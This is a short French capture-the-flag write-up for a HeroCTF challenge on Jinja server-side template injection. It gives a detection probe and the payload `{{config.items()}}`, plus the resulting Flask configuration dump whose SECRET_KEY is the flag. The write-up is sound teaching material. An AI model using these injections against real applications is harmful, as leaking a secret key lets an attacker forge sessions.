Ce challenge se base sur l'exploitation de Jinja, un moteur de template pour python.

On peut tester la vulnérabilité en essayant de rentrer `{{3*'3'}}{{3*3}}` dans le champs. Si le résultat retourné est `3339`, alors Jinja est ici sujet aux injections.

C'est le cas ici ! On essaye donc `{{config.items()}}` et on obtient le résultat suivant :

```php
Hello dict_items([(&#39;ENV&#39;, &#39;production&#39;), (&#39;DEBUG&#39;, False), (&#39;TESTING&#39;, False), (&#39;PROPAGATE_EXCEPTIONS&#39;, None), (&#39;PRESERVE_CONTEXT_ON_EXCEPTION&#39;, None), (&#39;SECRET_KEY&#39;, &#39;j1nj4_1nj3c710n_700_345y_4_m3_10114320&#39;), (&#39;PERMANENT_SESSION_LIFETIME&#39;, datetime.timedelta(days=31)), (&#39;USE_X_SENDFILE&#39;, False), (&#39;SERVER_NAME&#39;, None), (&#39;APPLICATION_ROOT&#39;, &#39;/&#39;), (&#39;SESSION_COOKIE_NAME&#39;, &#39;session&#39;), (&#39;SESSION_COOKIE_DOMAIN&#39;, False), (&#39;SESSION_COOKIE_PATH&#39;, None), (&#39;SESSION_COOKIE_HTTPONLY&#39;, True), (&#39;SESSION_COOKIE_SECURE&#39;, False), (&#39;SESSION_COOKIE_SAMESITE&#39;, None), (&#39;SESSION_REFRESH_EACH_REQUEST&#39;, True), (&#39;MAX_CONTENT_LENGTH&#39;, None), (&#39;SEND_FILE_MAX_AGE_DEFAULT&#39;, datetime.timedelta(seconds=43200)), (&#39;TRAP_BAD_REQUEST_ERRORS&#39;, None), (&#39;TRAP_HTTP_EXCEPTIONS&#39;, False), (&#39;EXPLAIN_TEMPLATE_LOADING&#39;, False), (&#39;PREFERRED_URL_SCHEME&#39;, &#39;http&#39;), (&#39;JSON_AS_ASCII&#39;, True), (&#39;JSON_SORT_KEYS&#39;, True), (&#39;JSONIFY_PRETTYPRINT_REGULAR&#39;, False), (&#39;JSONIFY_MIMETYPE&#39;, &#39;application/json&#39;), (&#39;TEMPLATES_AUTO_RELOAD&#39;, None), (&#39;MAX_COOKIE_SIZE&#39;, 4093)])
```
La partie qui nous intéresse pour ce challenge est celle-ci :
```
(&#39;SECRET_KEY&#39;, &#39;j1nj4_1nj3c710n_700_345y_4_m3_10114320&#39;)
```
HeroCTF{j1nj4_1nj3c710n_700_345y_4_m3_10114320}
